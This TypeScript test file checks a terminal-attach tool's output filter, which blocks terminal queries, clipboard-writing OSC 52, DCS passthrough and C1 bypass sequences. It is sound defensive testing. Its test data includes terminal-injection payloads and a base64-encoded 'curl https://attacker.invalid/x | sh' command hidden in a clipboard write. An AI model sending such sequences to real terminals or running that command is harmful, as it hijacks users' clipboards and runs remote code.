// The output filter of `smurg attach` (src/attach/output-filter.ts): an allow-list. What a session writes reaches the
// attaching person's real terminal only as text, harmless controls and COMPLETE allow-listed sequences. Covered here:
//  - the original split-point test (every query and all OSC 52 dropped, the rest kept, at every split point);
//  - SEC-E-01: C1 (8-bit) introducers, DCS passthrough (tmux / screen) and OSC "containers" hiding a sequence;
//  - SEC-D-02: an OSC 52 held beyond 64 KiB, split across a pause, or streamed in small chunks never gets out;
//  - a fuzz test: hostile random streams, random chunking; a real terminal engine (@xterm/headless) never answers
//    (onData) and never sees OSC 52 or a DCS, and the output always parses as allow-listed pieces.
import { describe, expect, it } from 'vitest';
import xtermHeadless from '@xterm/headless';
import { OutputFilter, localeIsUtf8 } from '../src/attach/output-filter.ts';
import { findDetach } from '../src/attach/attach-session.ts';

const { Terminal } = xtermHeadless;

const enc = (s: string): Uint8Array => new Uint8Array(Buffer.from(s, 'utf8'));
const text = (b: Uint8Array): string => Buffer.from(b).toString('utf8');

function run(chunks: readonly Uint8Array[], filter = new OutputFilter()): Uint8Array {
  return new Uint8Array(Buffer.concat(chunks.map((c) => Buffer.from(filter.push(c)))));
}

/** [input, what reaches the terminal]: passed (ST-terminated OSC comes out BEL-terminated, re-encoded). */
const keep: readonly (readonly [string, string])[] = [
  ['plain text 日本語 ', 'plain text 日本語 '],
  ['\x1b[?1049h', '\x1b[?1049h'],
  ['\x1b[38;2;215;119;87m', '\x1b[38;2;215;119;87m'],
  ['\x1b[38:2::215:119:87m', '\x1b[38:2::215:119:87m'],
  ['\x1b[2K', '\x1b[2K'],
  ['\x1b[5A', '\x1b[5A'],
  ['\x1b[?2004h', '\x1b[?2004h'],
  ['\x1b[?2026h', '\x1b[?2026h'],
  ['\x1b[2 q', '\x1b[2 q'],
  ['\x1b[>1u', '\x1b[>1u'],
  ['\x1b[<u', '\x1b[<u'],
  ['\x1b[22;0t', '\x1b[22;0t'],
  ['\x1b]0;✳ Claude Code\x07', '\x1b]0;✳ Claude Code\x07'],
  ['\x1b]11;rgb:0000/0000/0000\x1b\\', '\x1b]11;rgb:0000/0000/0000\x07'],
  ['\x1b]8;id=1;https://example.invalid/a\x1b\\', '\x1b]8;id=1;https://example.invalid/a\x07'],
  ['\x1b7', '\x1b7'],
  ['\x1b8', '\x1b8'],
  ['\x1b(0qqq\x1b(B', '\x1b(0qqq\x1b(B'],
  ['\x1bc', '\x1bc'],
  ['\t\b\r\n\x07', '\t\b\r\n\x07'],
  ['end\r\n', 'end\r\n'],
];
const drop: readonly string[] = [
  '\x1b[c',
  '\x1b[>c',
  '\x1b[=c',
  '\x1b[>0q',
  '\x1b[6n',
  '\x1b[?6n',
  '\x1b[5n',
  '\x1b[?996n',
  '\x1b[?2004$p',
  '\x1b[4$p',
  '\x1b[?u',
  '\x1b[?4m',
  '\x1b[?1;1S',
  '\x1b[18t',
  '\x1b[14t',
  '\x1b[8;24;80t', // resizes the person's window: not needed to view a session
  '\x1b[1;1;1;1;1;1*y', // DECRQCRA
  '\x1b[x',
  '\x1b[5i',
  '\x1bZ', // DECID
  '\x1b G', // S8C1T: 8-bit replies
  '\x1b]11;?\x07',
  '\x1b]10;?\x1b\\',
  '\x1b]4;1;?\x07',
  '\x1b]52;c;?\x07',
  '\x1b]52;c;ZWNobyBwd25lZA==\x07',
  '\x1b]7;file://host/etc\x07',
  '\x1b]1337;File=name=eA==;inline=1:AAAA\x07',
  '\x1b]8;;javascript:alert(1)\x07',
  '\x1bP$qm\x1b\\',
  '\x1bP+q544e\x1b\\',
  '\x1bPq#0;2;0;0;0#0!10~-\x1b\\', // sixel: every DCS is dropped
  '\x1b_Gi=1,a=q;AAAA\x1b\\', // kitty graphics query (APC)
  '\x1b^privacy\x1b\\',
  '\x05', // ENQ (answerback)
  '\x00\x7f',
];

describe('OutputFilter: the allow-list', () => {
  it('drops every query, OSC 52, DCS / APC / PM and unknown sequences, keeps the rest, for every split point', () => {
    const parts: string[] = [];
    const expected: string[] = [];
    for (let i = 0; i < Math.max(keep.length, drop.length); i++) {
      const k = keep[i];
      const d = drop[i];
      if (k !== undefined) {
        parts.push(k[0]);
        expected.push(k[1]);
      }
      if (d !== undefined) parts.push(d);
    }
    const input = Buffer.from(parts.join(''), 'utf8');
    const want = Buffer.from(expected.join(''), 'utf8');
    for (let cut1 = 0; cut1 <= input.length; cut1++) {
      for (const cut2 of [cut1, Math.min(input.length, cut1 + 1), Math.min(input.length, cut1 + 7)]) {
        const out = Buffer.from(run([input.subarray(0, cut1), input.subarray(cut1, cut2), input.subarray(cut2)]));
        expect(out.equals(want), `split at ${cut1}/${cut2}: ${JSON.stringify(out.toString('utf8'))}`).toBe(true);
      }
    }
  });

  it('invalid UTF-8 and raw 8-bit bytes become U+FFFD; C1 code points never pass as themselves', () => {
    expect(text(run([Uint8Array.from([0x61, 0x9b, 0x63, 0xc0, 0xaf, 0xed, 0xa0, 0x80, 0x62])]))).toBe('a�c���b');
    const out = text(run([enc('x\u0085y\u0084z')]));
    expect(out).toBe('x\x1bEy\x1bDz'); // NEL / IND in their 7-bit form
    expect(/[\u0080-\u009f]/.test(out)).toBe(false);
  });

  it('a terminal that is not UTF-8 gets ASCII only (UTF-8 continuation bytes 0x80-0x9F would be C1 there)', () => {
    const filter = new OutputFilter({ utf8: false });
    const out = run([enc('ěěc日\x1b]0;標題 t\x07ok')], filter);
    expect(text(out)).toBe('??c?\x1b]0;?? t\x07ok');
    expect(localeIsUtf8({ LANG: 'zh_TW.UTF-8' })).toBe(true);
    expect(localeIsUtf8({ LC_ALL: 'C', LANG: 'zh_TW.UTF-8' })).toBe(false);
    expect(localeIsUtf8({ LC_CTYPE: 'en_US.ISO8859-1' })).toBe(false);
    expect(localeIsUtf8({})).toBe(true);
  });
});

// ---- The reviewer's bypasses, judged by a real terminal engine.

const b64 = Buffer.from('curl https://attacker.invalid/x | sh\n').toString('base64');
const BYPASSES: readonly (readonly [string, string])[] = [
  ['C1 DA1 (U+009B c)', '\u009bc'],
  ['C1 OSC 52 write (U+009D)', `\u009d52;c;${b64}\x07`],
  ['C1 OSC 52 read (U+009D, ST = U+009C)', '\u009d52;c;?\u009c'],
  ['C1 DCS DECRQSS (U+0090)', '\u0090$qm\u009c'],
  ['tmux DCS passthrough OSC 52', `\x1bPtmux;\x1b\x1b]52;c;${b64}\x07\x1b\\`],
  ['screen DCS passthrough OSC 52', `\x1bP\x1b]52;c;${b64}\x07\x1b\\`],
  ['OSC 0 container hiding DA1', '\x1b]0;t\x1b\x1b[c\x07'],
  ['OSC 0 container hiding OSC 52', `\x1b]0;t\x1b\x1b]52;c;${b64}\x07`],
  ['OSC 0 container hiding DECRQSS', '\x1b]0;t\x1b\x1bP$qm\x1b\\'],
  ['OSC 0 ended by a C1 CSI', '\x1b]0;t\u009bc'],
  ['CSI aborted by ESC, then DA2', '\x1b[1;\x1b[>c'],
  ['APC then DA1', '\x1b_x\x1b\\\x1b[c'],
  ['DECID', '\x1bZ'],
];

interface Observed {
  readonly answers: string[];
  readonly osc52: string[];
  readonly dcs: string[];
}

function observedTerminal(): { term: InstanceType<typeof Terminal>; seen: Observed; write(data: Uint8Array): Promise<void> } {
  const term = new Terminal({ cols: 80, rows: 10, allowProposedApi: true });
  const seen: Observed = { answers: [], osc52: [], dcs: [] };
  term.onData((d) => seen.answers.push(d));
  term.parser.registerOscHandler(52, (data) => {
    seen.osc52.push(data);
    return true;
  });
  for (const id of [{ final: 'q' }, { intermediates: '$', final: 'q' }, { intermediates: '+', final: 'q' }, { final: 'p' }, { final: 't' }]) {
    term.parser.registerDcsHandler(id, (data) => {
      seen.dcs.push(data);
      return false; // and let xterm's own handler run too (it answers DECRQSS)
    });
  }
  return { term, seen, write: (data) => new Promise<void>((resolve) => term.write(data, resolve)) };
}

describe('OutputFilter: SEC-E-01 bypasses never reach the terminal', () => {
  it('control: unfiltered, the terminal engine answers / receives them (the harness sees a bypass)', async () => {
    const t = observedTerminal();
    for (const [, seq] of BYPASSES) await t.write(enc(`before ${seq} after`));
    t.term.dispose();
    expect(t.seen.answers.length).toBeGreaterThan(0);
    expect(t.seen.osc52.length).toBeGreaterThan(0);
  });

  it.each(BYPASSES)('%s: no answer, no OSC 52, no DCS — whole and split into single bytes', async (_name, seq) => {
    for (const chunks of [[enc(`before ${seq} after`)], [...enc(`before ${seq} after`)].map((b) => Uint8Array.of(b))]) {
      const t = observedTerminal();
      await t.write(run(chunks));
      t.term.dispose();
      expect(t.seen).toEqual({ answers: [], osc52: [], dcs: [] });
    }
  });
});

// ---- An incomplete OSC 52 never leaves the filter (the reviewer's d3-attach-osc52-length.test.ts).

describe('OutputFilter: SEC-D-02 incomplete sequences are never emitted', () => {
  const marker = Buffer.from('MARKER').toString('base64');
  const noOsc52 = (out: string): void => {
    expect(out.includes('\x1b]52')).toBe(false);
    expect(out.includes(marker)).toBe(false);
  };

  it('control: a short OSC 52 in one chunk is removed', () => {
    expect(text(run([enc(`before\x1b]52;c;${marker}\x07after`)]))).toBe('beforeafter');
  });

  it('a body longer than 64 KiB with the terminator in the next chunk', () => {
    const out = text(run([enc(`x\x1b]52;c;${marker}${'A'.repeat(70_000)}`), enc('\x07y')]));
    noOsc52(out);
    expect(out).toBe('xy');
  });

  it('a pause in the middle (the old 50 ms idle flush): nothing is written until the sequence ends, then nothing of it', () => {
    const filter = new OutputFilter();
    expect(text(filter.push(enc(`ok\x1b]52;c;${marker}`)))).toBe('ok');
    // …a long pause: attach-session no longer flushes anything on idle…
    expect(text(filter.push(enc('\x07after')))).toBe('after');
  });

  it('an OSC 52 streamed in many small chunks totalling more than 64 KiB, and in 1-byte chunks', () => {
    const chunks = [enc('\x1b]52;c;'), ...Array.from({ length: 20 }, () => enc('A'.repeat(4096))), enc('\x07')];
    expect(text(run(chunks))).toBe('');
    const bytes = enc(`a\x1b]52;c;${marker}\x07b`);
    expect(text(run([...bytes].map((b) => Uint8Array.of(b))))).toBe('ab');
  });

  it('never-terminated strings and sequences are dropped with bounded memory, and text after their end passes', () => {
    const filter = new OutputFilter();
    let total = 0;
    total += filter.push(enc('\x1b]0;')).length;
    for (let i = 0; i < 100; i++) total += filter.push(enc('t'.repeat(10_000))).length;
    expect(total).toBe(0); // an over-long title is dropped, not passed
    expect(text(filter.push(enc('\x07visible')))).toBe('visible');
    expect(text(filter.push(enc(`\x1b[${'1;'.repeat(5000)}m then`)))).toBe(' then');
    expect(text(filter.push(enc(`\x1bP${'x'.repeat(100_000)}\x1b\\done`)))).toBe('done');
  });
});

// ---- Fuzz: hostile random streams in random chunks.

function prng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const TOKENS: readonly (string | Uint8Array)[] = [
  '\x1b', '\x1b', '\x1b', '[', '[', ']', ']', 'P', '_', '^', 'X', '\\', '\x07', '\x07', '\x18', '\x1a', '?', '>', '=', '<',
  '$', '!', ' ', '*', '+', ';', ';', ':', '0', '1', '2', '4', '5', '6', '8', '11', '14', '18', '22', '52', '52;c;', '1337',
  'c', 'n', 'q', 'p', 't', 'u', 'm', 'h', 'l', 'x', 'y', 'S', 'Z', 'G', 'tmux;', 'rgb:ff/ff/ff', `${b64}`,
  '\u009b', '\u009d', '\u0090', '\u009c', '\u009f', '\u0098', '\u009e', '\u0085', 'é', '日', 'ě', '\x05', '\x00', '\x7f', '\r\n', 'text ',
  Uint8Array.of(0x9b), Uint8Array.of(0x9d), Uint8Array.of(0x90), Uint8Array.of(0xc2), Uint8Array.of(0xe6, 0x97), Uint8Array.of(0xff),
];

/** Every ESC in `out` starts a complete sequence of an allow-listed shape; no C1, no disallowed C0, valid UTF-8. */
function assertAllowListed(out: Uint8Array): void {
  const s = new TextDecoder('utf-8', { fatal: true }).decode(out);
  expect(/[\u0080-\u009f]/.test(s)).toBe(false);
  // eslint-disable-next-line no-control-regex
  expect(/[\u0000-\u0006\u0010-\u001a\u001c-\u001f\u007f]/.test(s)).toBe(false);
  const piece =
    // eslint-disable-next-line no-control-regex
    /\x1b(?:\[(?:[?][0-9:;]*[hlJKsr]|[>][0-9:;]*[mnpu]|[<=][0-9:;]*u|[0-9:;]* q|[0-9:;]*!p|2[23](?:[:;][0-9:;]*)?t|[0-9:;]*[@A-HJ-MPSTXZ`abdefghlmrsu]|[0-9:;]*I)|\](?:[012];[^\x00-\x1f\x7f-\x9f]*|8;[A-Za-z0-9=:_.-]*;(?:https?:\/\/[\x21-\x7e]+)?|(?:4|1[0-9]|104|11[0-9])(?:;[\x20-\x3e\x40-\x7e]*)?)\x07|[78=>cDEHMNO]|[()*+\-./][0-~]|#[34568]|%[@G8])/y;
  for (let i = s.indexOf('\x1b'); i >= 0; i = s.indexOf('\x1b', i + 1)) {
    piece.lastIndex = i;
    expect(piece.test(s), `not allow-listed at ${i}: ${JSON.stringify(s.slice(i, i + 40))}`).toBe(true);
  }
}

describe('OutputFilter: fuzz', () => {
  it('random hostile streams in random chunks: allow-listed output only, and the terminal never answers or sees OSC 52 / DCS', async () => {
    const random = prng(0x5eed1234);
    const t = observedTerminal();
    for (let round = 0; round < 400; round++) {
      const parts: Buffer[] = [];
      const count = 5 + Math.floor(random() * 120);
      for (let k = 0; k < count; k++) {
        const token = TOKENS[Math.floor(random() * TOKENS.length)] as string | Uint8Array;
        parts.push(typeof token === 'string' ? Buffer.from(token, 'utf8') : Buffer.from(token));
      }
      const input = Buffer.concat(parts);
      const filter = new OutputFilter();
      const outs: Buffer[] = [];
      for (let at = 0; at < input.length; ) {
        const size = 1 + Math.floor(random() * 24);
        outs.push(Buffer.from(filter.push(input.subarray(at, at + size))));
        at += size;
      }
      const out = new Uint8Array(Buffer.concat(outs));
      assertAllowListed(out);
      await t.write(out);
    }
    t.term.dispose();
    expect(t.seen).toEqual({ answers: [], osc52: [], dcs: [] });
  });
});

describe('detach key', () => {
  it('finds Ctrl-] and its CSI-u form, whichever comes first', () => {
    expect(findDetach(Buffer.from('abc'))).toBe(-1);
    expect(findDetach(Buffer.from('ab\x1dc'))).toBe(2);
    expect(findDetach(Buffer.from('x\x1b[93;5u'))).toBe(1);
    expect(findDetach(Buffer.from('\x1b[93;5u\x1d'))).toBe(0);
  });
});
